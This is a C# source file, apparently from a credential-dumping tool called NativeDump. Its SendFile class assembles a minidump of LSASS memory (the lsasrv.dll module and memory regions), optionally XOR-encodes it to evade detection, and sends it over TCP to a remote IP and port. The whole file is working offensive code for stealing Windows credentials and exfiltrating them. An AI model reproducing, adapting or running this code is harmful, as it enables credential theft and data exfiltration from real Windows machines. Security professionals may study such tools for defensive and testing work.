﻿using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static NativeDump.Win32;
using System.Net;
using System.Net.Sockets;
using System.Text;


namespace NativeDump
{
    internal class SendFile
    {
        public static byte[] JoinByteArrays(params byte[][] arrays)
        {
            return arrays.SelectMany(array => array).ToArray();
        }


        public static byte[] StructToByteArray<T>(T structInstance) where T : struct
        {
            int structSize = Marshal.SizeOf(structInstance);
            byte[] byteArray = new byte[structSize];
            IntPtr ptr = Marshal.AllocHGlobal(structSize);
            Marshal.StructureToPtr(structInstance, ptr, true);
            Marshal.Copy(ptr, byteArray, 0, structSize);
            Marshal.FreeHGlobal(ptr);
            return byteArray;
        }


        public static void SendBytes(string ipAddress, int portNumber, byte[] bytesToSend) {
            IPAddress serverAddress = IPAddress.Parse(ipAddress);
            int serverPort = portNumber;
            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            clientSocket.Connect(new IPEndPoint(serverAddress, serverPort));
            clientSocket.Send(bytesToSend);
            clientSocket.Shutdown(SocketShutdown.Both);
            clientSocket.Close();
        }


        public static void Send(IntPtr lsasrvdll_address, int lsasrvdll_size, string lsasrv_name, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr, OSVERSIONINFOEX osVersionInfo, string ipAddress, int portNumber, bool xor_bytes, byte xor_byte)
        {            
            // Header
            MinidumpHeader header = new MinidumpHeader();
            header.Signature = 0x504d444d;
            header.Version = 0xa793;
            header.NumberOfStreams = 0x3;
            header.StreamDirectoryRva = 0x20;
            
            // Stream Directory
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_1 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_1.StreamType = 4;
            minidumpStreamDirectoryEntry_1.Size = 112;
            minidumpStreamDirectoryEntry_1.Location = 0x7c;
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_2 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_2.StreamType = 7;
            minidumpStreamDirectoryEntry_2.Size = 56;
            minidumpStreamDirectoryEntry_2.Location = 0x44;
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_3 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_3.StreamType = 9;
            minidumpStreamDirectoryEntry_3.Size = (uint)(16 + 16 * mem64info_List.Count);
            minidumpStreamDirectoryEntry_3.Location = 0x12A;
            
            // SystemInfoStream
            SystemInfoStream systemInfoStream = new SystemInfoStream();
            systemInfoStream.ProcessorArchitecture = 0x9;
            systemInfoStream.MajorVersion = (uint)osVersionInfo.dwMajorVersion;
            systemInfoStream.MinorVersion = (uint)osVersionInfo.dwMinorVersion;
            systemInfoStream.BuildNumber = (uint)osVersionInfo.dwBuildNumber;
            
            // ModuleList
            ModuleListStream moduleListStream = new ModuleListStream();
            moduleListStream.NumberOfModules = 1;
            moduleListStream.BaseAddress = lsasrvdll_address;
            moduleListStream.Size = (uint)lsasrvdll_size;
            moduleListStream.PointerName = 0xE8;
            // ModuleList - Unicode string
            string dll_str = "C:\\Windows\\System32\\" + lsasrv_name;    
            CUSTOM_UNICODE_STRING dllName = new CUSTOM_UNICODE_STRING();
            dllName.Length = (uint)(dll_str.Length * 2);
            dllName.Buffer = dll_str;

            // Memory64List
            int number_of_entries = mem64info_List.Count;
            int offset_mem_regions = 0x12A + 16 + (16 * number_of_entries);
            Memory64ListStream memory64ListStream = new Memory64ListStream();
            memory64ListStream.NumberOfEntries = (ulong)number_of_entries;
            memory64ListStream.MemoryRegionsBaseAddress = (uint)offset_mem_regions;
            byte[] memory64ListStream_byte_arr = StructToByteArray(memory64ListStream);
            for (int i = 0; i < mem64info_List.Count; i++)
            {
                Memory64Info memory64Info = mem64info_List[i];
                memory64ListStream_byte_arr = JoinByteArrays(memory64ListStream_byte_arr, StructToByteArray(memory64Info));
            }

            // Create Minidump file complete byte array
            byte[] header_byte_arr = StructToByteArray(header);
            byte[] streamDirectory_byte_arr = JoinByteArrays(StructToByteArray(minidumpStreamDirectoryEntry_1), StructToByteArray(minidumpStreamDirectoryEntry_2), StructToByteArray(minidumpStreamDirectoryEntry_3));
            byte[] systemInfoStream_byte_arr = StructToByteArray(systemInfoStream);
            byte[] moduleListStream_byte_arr = JoinByteArrays(StructToByteArray(moduleListStream), StructToByteArray(dllName));
            byte[] minidumpFile = JoinByteArrays(header_byte_arr, streamDirectory_byte_arr, systemInfoStream_byte_arr, moduleListStream_byte_arr, memory64ListStream_byte_arr, memoryRegions_byte_arr);

            // Encoding
            if (xor_bytes) {
                for (int i = 0; i < minidumpFile.Length; i++)
                {
                    minidumpFile[i] = (byte)(minidumpFile[i] ^ xor_byte);
                }
            }
            
            // Send file
            try
            {
                SendBytes(ipAddress, portNumber, minidumpFile);
                Console.WriteLine("[+] File sent.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] It was not possible to send the file. Exception message: " + ex.Message);
            }
            
        }
    }
}
